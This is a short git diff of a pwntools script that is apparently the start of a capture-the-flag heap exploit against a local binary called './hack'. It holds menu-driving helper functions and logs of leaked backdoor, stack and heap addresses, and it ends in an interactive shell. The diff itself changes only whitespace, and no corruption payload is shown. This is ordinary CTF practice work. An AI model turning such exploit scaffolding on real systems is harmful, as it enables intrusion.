@@ -4,6 +4,8 @@ from pwn import *
 # context.log_level = 'debug'
 
 p = process('./hack')
+
+
 # p = remote('127.0.0.1', 23455)
 
 def addi(size, content):
@@ -11,14 +13,17 @@ def addi(size, content):
     p.sendlineafter('size>', str(size))
     p.sendlineafter('content>', content)
 
+
 def deli(index):
     p.sendlineafter('choice>', '2')
     p.sendlineafter('index>', str(index))
+
 
 def modi(index, content):
     p.sendlineafter('choice>', '3')
     p.sendlineafter('index>', str(index))
     p.sendlineafter('content>', content)
+
 
 def dspi(index):
     p.sendlineafter('choice>', '9')
@@ -36,11 +41,7 @@ p.info('backdoor addr: 0x%x', dokodemo_doa)
 p.info('stack addr: 0x%x', stack_addr)
 p.info('heap addr: 0x%x', heap_addr)
 
-
-
 addi(0x20, 'sekai de ichiban')
 addi(0x30, 'southern university of science and technology')
-
-
 
 p.interactive()
